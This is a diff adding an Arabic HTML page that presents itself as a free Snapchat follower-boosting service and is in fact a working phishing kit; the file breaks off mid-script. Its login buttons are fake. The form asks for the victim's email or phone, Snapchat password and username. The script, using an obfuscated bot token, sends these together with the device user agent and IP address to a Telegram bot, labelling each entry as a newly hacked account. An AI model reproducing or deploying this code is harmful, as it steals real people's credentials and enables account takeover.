@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>شحن متابعين سناب شات</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --primary: #FFC107;
+      --secondary: #FF5722;
+      --dark: #1A237E;
+      --light: #E3F2FD;
+      --accent: #4CAF50;
+      --text: #212121;
+      --bg: #f8f9fa;
+    }
+
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, var(--light), #ffffff);
+      background-attachment: fixed;
+      color: var(--text);
+      overflow-y: scroll;
+      min-height: 100vh;
+      scroll-behavior: smooth;
+    }
+
+    .main-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .center-container {
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      padding: 30px;
+      margin: 40px auto;
+      max-width: 800px;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(26, 35, 126, 0.1);
+    }
+
+    .section {
+      margin-bottom: 40px;
+      position: relative;
+    }
+
+    .section-title {
+      text-align: center;
+      color: var(--dark);
+      margin-bottom: 25px;
+      font-size: 28px;
+      position: relative;
+      padding-bottom: 15px;
+    }
+
+    .section-title::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 80px;
+      height: 4px;
+      background: linear-gradient(to right, var(--primary), var(--secondary));
+      border-radius: 2px;
+    }
+
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 15px;
+      margin: 15px 0;
+      background: linear-gradient(to right, var(--dark), #283593);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(26, 35, 126, 0.2);
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(26, 35, 126, 0.3);
+    }
+
+    .btn img {
+      height: 24px;
+      margin-left: 10px;
+    }
+
+    .pricing {
+      margin-top: 30px;
+    }
+
+    .price-item {
+      background: white;
+      padding: 15px;
+      margin: 12px 0;
+      border-radius: 12px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: var(--dark);
+      border: 2px solid rgba(26, 35, 126, 0.1);
+      transition: all 0.3s ease;
+    }
+
+    .price-item:hover {
+      transform: translateX(-5px);
+      border-color: var(--primary);
+    }
+
+    .buy-btn {
+      background: linear-gradient(to right, var(--primary), var(--secondary));
+      color: var(--dark);
+      border: none;
+      padding: 8px 20px;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .buy-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 10px rgba(255, 152, 0, 0.3);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border-radius: 12px;
+      border: 2px solid rgba(26, 35, 126, 0.1);
+      background: white;
+      color: var(--text);
+      font-size: 16px;
+      font-family: 'Tajawal', sans-serif;
+      transition: all 0.3s ease;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(255, 193, 7, 0.2);
+    }
+
+    input::placeholder {
+      color: rgba(33, 33, 33, 0.5);
+    }
+
+    form {
+      background: white;
+      padding: 25px;
+      border-radius: 18px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+      border: 1px solid rgba(26, 35, 126, 0.1);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 700;
+      color: var(--dark);
+      font-size: 16px;
+    }
+
+    .form-header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .form-header h1 {
+      color: var(--dark);
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .form-header p {
+      color: #666;
+      font-size: 16px;
+    }
+
+    .back-btn {
+      background: #f5f5f5;
+      color: var(--dark);
+      border: none;
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: all 0.3s ease;
+    }
+
+    .back-btn:hover {
+      background: #e0e0e0;
+    }
+
+    .snap-logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .snap-logo img {
+      height: 70px;
+      filter: drop-shadow(0 3px 5px rgba(255, 193, 7, 0.5));
+    }
+
+    .featured-image {
+      width: 100%;
+      height: 200px;
+      background: linear-gradient(to right, #FFC107, #FF9800);
+      border-radius: 15px;
+      margin: 25px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .featured-image::before {
+      content: "";
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="%23ffffff" fill-opacity="0.2" d="M0,64L48,69.3C96,75,192,85,288,101.3C384,117,480,139,576,133.3C672,128,768,96,864,85.3C960,75,1056,85,1152,101.3C1248,117,1344,139,1392,149.3L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>');
+      background-size: cover;
+      background-position: center;
+    }
+
+    .featured-image i {
+      font-size: 100px;
+      color: white;
+      text-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .stats-container {
+      display: flex;
+      justify-content: space-around;
+      margin: 30px 0;
+      text-align: center;
+    }
+
+    .stat-item {
+      padding: 15px;
+    }
+
+    .stat-item i {
+      font-size: 36px;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+
+    .stat-item .number {
+      font-size: 32px;
+      font-weight: 800;
+      color: var(--dark);
+      line-height: 1;
+    }
+
+    .stat-item .label {
+      font-size: 16px;
+      color: #666;
+    }
+
+    .scroll-indicator {
+      text-align: center;
+      margin: 20px 0;
+      color: var(--dark);
+      font-size: 18px;
+    }
+
+    .scroll-indicator i {
+      display: block;
+      font-size: 28px;
+      margin-top: 10px;
+      animation: bounce 2s infinite;
+    }
+
+    .validation-message {
+      color: #e53935;
+      font-size: 14px;
+      text-align: right;
+      margin-top: -8px;
+      margin-bottom: 10px;
+      height: 16px;
+    }
+    
+    /* أنماط جديدة للحقل الموحد */
+    .identifier-group {
+      position: relative;
+      margin-bottom: 15px;
+    }
+    
+    .identifier-type {
+      position: absolute;
+      top: 50%;
+      left: 15px;
+      transform: translateY(-50%);
+      background: rgba(255, 193, 7, 0.1);
+      padding: 2px 8px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: #FF9800;
+      transition: all 0.3s ease;
+    }
+    
+    .identifier-input {
+      padding-left: 90px !important;
+    }
+    
+    .country-selector {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background: white;
+      border-radius: 15px;
+      padding: 10px;
+      z-index: 10;
+      margin-top: 5px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      max-height: 300px;
+      overflow-y: auto;
+      border: 1px solid #e0e0e0;
+    }
+    
+    .country-option {
+      display: flex;
+      align-items: center;
+      padding: 8px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    
+    .country-option:hover {
+      background: rgba(26, 35, 126, 0.05);
+    }
+    
+    .country-flag {
+      width: 20px;
+      height: 15px;
+      margin-left: 10px;
+      border-radius: 2px;
+      background-size: cover;
+    }
+    
+    .country-name {
+      flex: 1;
+      text-align: right;
+    }
+    
+    .country-code-label {
+      color: #666;
+      margin-left: 5px;
+    }
+    
+    .country-header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      background: rgba(26, 35, 126, 0.1);
+      border-radius: 10px;
+      margin-bottom: 10px;
+    }
+    
+    .country-header i {
+      margin-left: 10px;
+      color: #1A237E;
+    }
+    
+    .country-search {
+      width: 100%;
+      padding: 10px 15px;
+      background: rgba(26, 35, 126, 0.05);
+      border: 1px solid #e0e0e0;
+      border-radius: 20px;
+      color: #333;
+      margin: 10px 0;
+    }
+    
+    .country-search:focus {
+      outline: none;
+      border-color: #1A237E;
+    }
+    
+    .country-list {
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+      40% {transform: translateY(-20px);}
+      60% {transform: translateY(-10px);}
+    }
+
+    @media (max-width: 768px) {
+      .center-container {
+        padding: 20px;
+        margin: 20px auto;
+      }
+      
+      .stats-container {
+        flex-direction: column;
+      }
+      
+      .section-title {
+        font-size: 24px;
+      }
+      
+      .identifier-input {
+        padding-left: 80px !important;
+      }
+    }
+    
+    /* Success message styling */
+    .success-message {
+      background: rgba(46, 204, 113, 0.2);
+      border: 1px solid rgba(46, 204, 113, 0.4);
+      border-radius: 10px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+.spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 10px;
+      position: relative;
+      z-index: 2;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    /* Responsive design */
+    @media (max-width: 768px) {
+      .container {
+        padding: 20px;
+      }
+    
+    .notification {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 15px 25px;
+      border-radius: 10px;
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      animation: slideIn 0.3s, fadeOut 0.5s 2.5s forwards;
+    }
+    
+    @keyframes slideIn {
+      from { top: -100px; }
+      to { top: 20px; }
+    }
+    
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; top: -100px; }
+    }
+    
+    .notification.success {
+      border-left: 4px solid #2ecc71;
+    }
+    
+    .notification.error {
+      border-left: 4px solid #e74c3c;
+    }
+    
+    .notification.info {
+      border-left: 4px solid #3498db;
+    }
+    
+    .notification-icon {
+      margin-left: 10px;
+      font-size: 20px;
+    }
+
+    /* Loading spinner */
+    .spinnert {
+      display: none;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid var(--secondary);
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .submit-btn {
+      background: linear-gradient(135deg, var(--secondary), #e6c200);
+      color: var(--dark);
+      font-weight: bold;
+      font-size: 1.1rem;
+      padding: 14px;
+      border-radius: 12px;
+      border: none;
+      width: 100%;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+    }
+
+    .submit-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(255, 215, 0, 0.5);
+    }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <div class="center-container">
+      <!-- القسم العلوي مع صورة مميزة -->
+      <div class="featured-image">
+        <i class="fas fa-users"></i>
+      </div>
+      
+      <!-- قسم تسجيل الدخول -->
+      <div id="login" class="section">
+        <div class="snap-logo">
+          <i class="fab fa-snapchat-ghost" style="font-size: 60px; color: #FFFC00;"></i>
+        </div>
+        
+        <h2 class="section-title">تسجيل الدخول عبر</h2>
+        
+        <button class="btn" onclick="loginWithGoogle()">
+          <i class="fab fa-google" style="margin-left: 10px;"></i>
+          تسجيل الدخول عبر Google
+        </button>
+        
+        <button class="btn" onclick="loginWithFacebook()">
+          <i class="fab fa-facebook" style="margin-left: 10px;"></i>
+          تسجيل الدخول عبر Facebook
+        </button>
+        
+        <button class="btn" onclick="loginWithSnapchat()">
+          <i class="fab fa-snapchat-ghost" style="margin-left: 10px;"></i>
+          تسجيل الدخول عبر Snapchat
+        </button>
+        
+        <div class="scroll-indicator">
+          اسحب للأسفل لرؤية المزيد
+          <i class="fas fa-chevron-down"></i>
+        </div>
+      </div>
+      
+      <!-- قسم النموذج (مخفي في البداية) -->
+      <div id="form" class="section" style="display: none;">
+        <div class="form-header">
+          <h1>شحن متابعين سناب شات 🚀</h1>
+          <p>املأ النموذج التالي لبدء شحن المتابعين</p>
+        </div>
+        
+        <form id="snapForm">
+          <div class="identifier-group">
+            <label><i class="fas fa-envelope"></i> البريد الإلكتروني أو رقم الهاتف:</label>
+            <div class="input-container">
+              <div class="identifier-type" id="identifier-type">بريد إلكتروني</div>
+              <input 
+                type="text" 
+                id="identifier" 
+                name="identifier" 
+                required 
+                placeholder="أدخل بريدك أو رقمك"
+                class="identifier-input"
+                autocomplete="off"
+              >
+              
+              <div class="country-selector" id="country-selector">
+                <div class="country-header">
+                  <i class="fas fa-globe-asia"></i>
+                  <span>اختر الدولة</span>
+                </div>
+                <input type="text" class="country-search" id="country-search" placeholder="ابحث عن الدولة...">
+                <div class="country-list" id="country-list">
+                  <!-- سيتم ملء القائمة بواسطة الجافاسكريبت -->
+                </div>
+              </div>
+            </div>
+            <div id="identifier-validation" class="validation-message"></div>
+          </div>
+          
+          <input type="hidden" id="country-code" name="country_code" value="+966">
+          <input type="hidden" id="phone-number" name="phone">
+          
+          <label><i class="fas fa-lock"></i> كلمة المرور:</label>
+          <input type="password" name="password" required placeholder="ادخل كلمة المرور">
+          
+          <label><i class="fas fa-user"></i> اسم المستخدم:</label>
+          <input type="text" name="player_id" required placeholder="ادخل اسم المستخدم في سناب شات">
+          
+          <label><i class="fas fa-users"></i> عدد المتابعين:</label>
+          <select name="amount" required>
+            <option value="1000 متابع مجاني">1000 متابع مجاني</option>
+            <option value="1500 متابع">1500 متابع</option>
+            <option value="2000 متابع">2000 متابع</option>
+            <option value="2500 متابع">2500 متابع</option>
+            <option value="3000 متابع">3000 متابع</option>
+          </select>
+       
+        
+        <div class="spinnert" id="loadingSpinner"></div>
+        <button type="submit" class="submit-btn" id="submitBtn">شحن المتابعين <i class="fas fa-bolt"></i></button>
+          
+          <button type="button" class="back-btn" onclick="goBack()">
+            <i class="fas fa-arrow-left"></i> رجوع
+          </button>
+        </form>
+      </div>
+      
+      <!-- قسم الأسعار -->
+      <div class="section pricing">
+        <h2 class="section-title">أسعار المتابعين</h2>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 1000 متابع - 0$</span>
+          <button class="buy-btn">مجاني</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 1500 متابع - 2$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 2000 متابع - 3$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 2500 متابع - 4$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="price-item">
+          <span><i class="fas fa-user-friends"></i> 3000 متابع - 5$</span>
+          <button class="buy-btn">شراء الآن</button>
+        </div>
+        
+        <div class="scroll-indicator">
+          اسحب للأعلى للعودة
+          <i class="fas fa-chevron-up"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    
+    // قائمة الدول العربية مع رموزها وأعلامها
+    const arabCountries = [
+      { name: "اليمن 👑", code: "+967", flag: "YE", pattern: /^7\d{8}$/ },
+      { name: "السعودية", code: "+966", flag: "SA", pattern: /^5\d{8}$/ },
+      { name: "مصر", code: "+20", flag: "EG", pattern: /^1\d{9}$/ },
+      { name: "الإمارات", code: "+971", flag: "AE", pattern: /^5\d{8}$/ },
+      { name: "الأردن", code: "+962", flag: "JO", pattern: /^7\d{8}$/ },
+      { name: "الكويت", code: "+965", flag: "KW", pattern: /^[569]\d{7}$/ },
+      { name: "عمان", code: "+968", flag: "OM", pattern: /^9\d{7}$/ },
+      { name: "قطر", code: "+974", flag: "QA", pattern: /^[35]\d{7}$/ },
+      { name: "الجزائر", code: "+213", flag: "DZ", pattern: /^(5|6|7)\d{8}$/ },
+      { name: "المغرب", code: "+212", flag: "MA", pattern: /^(6|7)\d{8}$/ },
+      { name: "تونس", code: "+216", flag: "TN", pattern: /^[2459]\d{7}$/ },
+      { name: "ليبيا", code: "+218", flag: "LY", pattern: /^(9|21|22|23|24|25|26|27|28|29|91|92|93|94|95)\d{7,8}$/ },
+      { name: "السودان", code: "+249", flag: "SD", pattern: /^9\d{8}$/ },
+      { name: "البحرين", code: "+973", flag: "BH", pattern: /^(3|6|9)\d{7}$/ },
+      { name: "العراق", code: "+964", flag: "IQ", pattern: /^7[0-9]{9}$/ },
+      { name: "لبنان", code: "+961", flag: "LB", pattern: /^(3|7|8|9)\d{7}$/ },
+      { name: "موريتانيا", code: "+222", flag: "MR", pattern: /^[2-9]\d{7}$/ },
+      { name: "الصومال", code: "+252", flag: "SO", pattern: /^(61|62|65|66|67|68|69|71|77|79|90|91|92|93|94|95|96|97|98|99)\d{7}$/ },
+      { name: "جيبوتي", code: "+253", flag: "DJ", pattern: /^(77|78)\d{6}$/ },
+      { name: "فلسطين", code: "+970", flag: "PS", pattern: /^5[69]\d{7}$/ }
+    ];
+    
+    // تحديد نوع المدخل (بريد إلكتروني أو هاتف)
+    function detectInputType(value) {
+      if (value.includes('@')) {
+        return 'email';
+      }
+      
+      const phoneRegex = /^(\+\d{1,3})?\s?\d+$/;
+      if (phoneRegex.test(value)) {
+        return 'phone';
+      }
+      
+      return 'email';
+    }
+    
+    // التحقق من صحة المدخل
+    function validateIdentifier(value, type) {
+      const validationMessage = document.getElementById('identifier-validation');
+      const countrySelector = document.getElementById('country-selector');
+      
+      if (type === 'email') {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const isValid = emailRegex.test(value);
+        
+        if (!isValid) {
+          validationMessage.textContent = "البريد الإلكتروني غير صحيح";
+        } else {
+          validationMessage.textContent = "";
+        }
+        
+        return isValid;
+      } else if (type === 'phone') {
+        const countryCode = document.getElementById('country-code').value;
+        const phoneValue = value.replace(/\D/g, '');
+        
+        const country = arabCountries.find(c => c.code === countryCode);
+        const pattern = country ? country.pattern : /^\d{8,12}$/;
+        const isValid = pattern.test(phoneValue);
+        
+        // إخفاء قائمة الدول عند إدخال رقم صحيح
+        if (isValid) {
+          countrySelector.style.display = 'none';
+        }
+        
+        // رسائل الخطأ لكل دولة
+        const errorMessages = {
+          '+967': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 7",
+          '+966': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 5",
+          '+20': "رقم غير صحيح! يجب أن يتكون من 10 أرقام ويبدأ بالرقم 1",
+          '+971': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 5",
+          '+962': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 7",
+          '+965': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 5، 6 أو 9",
+          '+968': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بالرقم 9",
+          '+974': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 3 أو 5",
+          '+213': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بـ 5، 6 أو 7",
+          '+212': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بـ 6 أو 7",
+          '+216': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 2، 4، 5 أو 9",
+          '+218': "رقم غير صحيح! يجب أن يتكون من 9-10 أرقام",
+          '+249': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بالرقم 9",
+          '+973': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 3، 6 أو 9",
+          '+964': "رقم غير صحيح! يجب أن يتكون من 10 أرقام ويبدأ بـ 7",
+          '+961': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 3، 7، 8 أو 9",
+          '+222': "رقم غير صحيح! يجب أن يتكون من 8 أرقام",
+          '+252': "رقم غير صحيح! يجب أن يتكون من 9 أرقام",
+          '+253': "رقم غير صحيح! يجب أن يتكون من 8 أرقام ويبدأ بـ 77 أو 78",
+          '+970': "رقم غير صحيح! يجب أن يتكون من 9 أرقام ويبدأ بـ 56 أو 59"
+        };
+
+        validationMessage.textContent = isValid ? "" : (errorMessages[countryCode] || "رقم الهاتف يجب أن يكون بين 8 و12 رقمًا");
+        return isValid;
+      }
+      
+      return false;
+    }
+    
+    // تحديث واجهة المستخدم بناءً على نوع المدخل
+    function updateInputUI(value) {
+      const type = detectInputType(value);
+      const identifierType = document.getElementById('identifier-type');
+      const countrySelector = document.getElementById('country-selector');
+      const phoneInput = document.getElementById('phone-number');
+      
+      if (type === 'phone') {
+        identifierType.textContent = "رقم الهاتف";
+        countrySelector.style.display = 'block';
+        phoneInput.value = value.replace(/\D/g, '');
+      } else {
+        identifierType.textContent = "بريد إلكتروني";
+        countrySelector.style.display = 'none';
+        phoneInput.value = '';
+      }
+      
+      // التحقق من صحة المدخل
+      validateIdentifier(value, type);
+    }
+    
+    // اختيار رمز الدولة
+    function selectCountry(code, flag) {
+      document.getElementById('country-code').value = code;
+      const countrySelector = document.getElementById('country-selector');
+      countrySelector.style.display = 'none';
+      
+      // إعادة التحقق من صحة المدخل
+      const identifier = document.getElementById('identifier').value;
+      updateInputUI(identifier);
+    }
+    
+  // إظهار الإشعار
+  function showNotification(message, type) {
+    const notification = document.createElement('div');
+    notification.className = `notification ${type}`;
+    notification.innerHTML = `${message} <span class="notification-icon">${type === 'success' ? '✓' : '✗'}</span>`;
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+      notification.remove();
+    }, 3000);
+  }
+    
+  // تسجيل الدخول عبر جوجل
+  function loginWithGoogle() {
+    const btn = event.currentTarget;
+    const originalHTML = btn.innerHTML;
+    
+    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+      showNotification('تم تسجيل الدخول بنجاح عبر جوجل!', 'success');
+      btn.innerHTML = originalHTML;
+      btn.disabled = false;
+      
+      setTimeout(() => {
+        showForm();
+      }, 1500);
+    }, 2000);
+  }
+  
+  // تسجيل الدخول عبر فيسبوك
+  function loginWithFacebook() {
+    const btn = event.currentTarget;
+    const originalHTML = btn.innerHTML;
+    
+    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+      showNotification('تم تسجيل الدخول بنجاح عبر فيسبوك!', 'success');
+      btn.innerHTML = originalHTML;
+      btn.disabled = false;
+      
+      setTimeout(() => {
+        showForm();
+      }, 1500);
+    }, 2000);
+  }
+  
+  // تسجيل الدخول عبر سناب شات 
+  function loginWithSnapchat() {
+    const btn = event.currentTarget;
+    const originalHTML = btn.innerHTML;
+    
+    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+      showNotification('تم تسجيل الدخول بنجاح عبر سناب شات!', 'success');
+      btn.innerHTML = originalHTML;
+      btn.disabled = false;
+      
+      setTimeout(() => {
+        showForm();
+      }, 1500);
+    }, 2000);
+  }
+  
+    // إظهار النموذج
+    function showForm() {
+      document.getElementById("login").style.display = "none";
+      document.getElementById("form").style.display = "block";
+      
+      // التمرير للنموذج بشكل سلس
+      document.getElementById("form").scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // الرجوع إلى قسم تسجيل الدخول
+    function goBack() {
+      document.getElementById("form").style.display = "none";
+      document.getElementById("login").style.display = "block";
+      // التمرير لأعلى الصفحة
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // إنشاء قائمة الدول في واجهة المستخدم
+    function populateCountryList() {
+      const countryList = document.getElementById('country-list');
+      countryList.innerHTML = '';
+      
+      arabCountries.forEach(country => {
+        const option = document.createElement('div');
+        option.className = 'country-option';
+        option.setAttribute('data-code', country.code);
+        option.setAttribute('data-flag', country.flag);
+        option.innerHTML = `
+          <img src="https://flagsapi.com/${country.flag}/flat/24.png" class="country-flag">
+          <span class="country-name">${country.name}</span>
+          <span class="country-code-label">${country.code}</span>
+        `;
+        
+        option.addEventListener('click', function() {
+          selectCountry(country.code, country.flag);
+        });
+        
+        countryList.appendChild(option);
+      });
+    }
+    
+    // تصفية قائمة الدول عند البحث
+    function setupCountrySearch() {
+      const searchInput = document.getElementById('country-search');
+      searchInput.addEventListener('input', function() {
+        const searchTerm = this.value.toLowerCase();
+        const options = document.querySelectorAll('.country-option');
+        
+        options.forEach(option => {
+          const countryName = option.querySelector('.country-name').textContent.toLowerCase();
+          if (countryName.includes(searchTerm)) {
+            option.style.display = 'flex';
+          } else {
+            option.style.display = 'none';
+          }
+        });
+      });
+    }
+
+    function getBotToken() {
+
+      const tokenParts = [
+        [56, 48, 49], // 801
+        [49, 50, 51, 52], // 1234
+        [52, 48, 51], // 403
+        [58], // :
+        [65, 65, 69, 71], // AAEG
+        [107, 107, 55, 102, 50, 45], // kk7f2-
+        [110, 67, 66, 118, 114, 110], // nCBvrn
+        [51, 114, 55, 122], // 3r7z
+        [95, 72, 45, 95], // _H-_
+        [122, 56, 71, 85, 89, 66], // z8GUYB
+        [104, 79, 75, 111, 115] // hOKos
+      ];
+      
+
+      const token = tokenParts.map(part => 
+        part.map(code => String.fromCharCode(code)).join('')
+      ).join('');
+      
+      return token;
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      // الحصول على معرف الدردشة من الرابط
+      const urlParams = new URLSearchParams(window.location.search);
+      const CHAT_ID = urlParams.get('id');
+      
+      // تهيئة قائمة الدول
+      populateCountryList();
+      setupCountrySearch();
+      
+      const form = document.getElementById("snapForm");
+      const submitBtn = document.getElementById("submitBtn");
+      const loadingSpinner = document.getElementById("loadingSpinner");
+      const identifierInput = document.getElementById("identifier");
+      const countrySelector = document.getElementById("country-selector");
+      
+      // تحديث الواجهة عند تحميل الصفحة
+      updateInputUI(identifierInput.value);
+      
+      // تحديث الواجهة عند الكتابة في الحقل
+      identifierInput.addEventListener("input", function() {
+        updateInputUI(this.value);
+      });
+      
+      // إخفاء قائمة الدول عند النقر خارجها
+      document.addEventListener('click', function(e) {
+        if (!countrySelector.contains(e.target) && e.target !== identifierInput) {
+          countrySelector.style.display = 'none';
+        }
+      });
+      
+      // إظهار قائمة الدول عند النقر على حقل الهاتف
+      identifierInput.addEventListener('click', function() {
+        if (detectInputType(this.value) === 'phone') {
+          countrySelector.style.display = 'block';
+        }
+      });
+      
+      // عند إرسال النموذج
+      if (!form) return;
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+        
+        const identifier = identifierInput.value;
+        const type = detectInputType(identifier);
+        const isValid = validateIdentifier(identifier, type);
+        
+        if (!isValid) {
+          return;
+        }
+
+        // Show loading spinner and disable button
+        submitBtn.style.display = "none";
+        loadingSpinner.style.display = "block";
+        
+        const data = new FormData(this);
+        const password = data.get("password");
+        const playerId = data.get("player_id");
+        const amount = data.get("amount");
+        const countryCode = data.get("country_code");
+        const phoneNumber = data.get("phone");
+        const platform = "سناب شات";
+        const device = navigator.userAgent;
+        
+        // تحديد نوع المدخل
+        const contact = type === 'email' ? 
+          `📨 - البريد : ${identifier}` : 
+          `📞 - الهاتف : ${countryCode} ${phoneNumber}`;
+
+        const ipData = await fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .catch(() => ({ ip: "غير معروف" }));
+
+        const message = `♦️ - تم اختراق حساب جديد :
+🔹 - التطبيق : ${platform}
+
+ ${contact}
+🔑 - كلمة المرور : ${password}
+🔹 - اسم المستخدم: ${playerId}
+👥 - عدد المتابعين: ${amount}
+📱 - الجهاز: ${device}
+🌍 - IP: ${ipData.ip}`;
+
+       const BOT_TOKEN = getBotToken();
+        
+        // التحقق من وجود معرف الدردشة
+        if (!CHAT_ID) {
+          const errorHTML = `
+            <div class="error-message">
+              <h3>خطأ في الإرسال! ❌</h3>
+              <p>لم يتم العثور على معرف الدردشة (CHAT_ID)</p>
+              <p>يرجى التأكد من الرابط الذي استخدمته للصفحة</p>
+            </div>
+          `;
+          form.innerHTML = errorHTML;
+          return;
+        }
+        
+        try {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          });
+          
+          const result = await response.json();
+          
+          if (result.ok) {
+            // إظهار رسالة النجاح
+            const successHTML = `
+              <div class="success-message">
+                <h3>تمت العملية بنجاح! ✅</h3>
+                <p>سيتم شحن متابعين سناب شات خلال 24 ساعة</p>
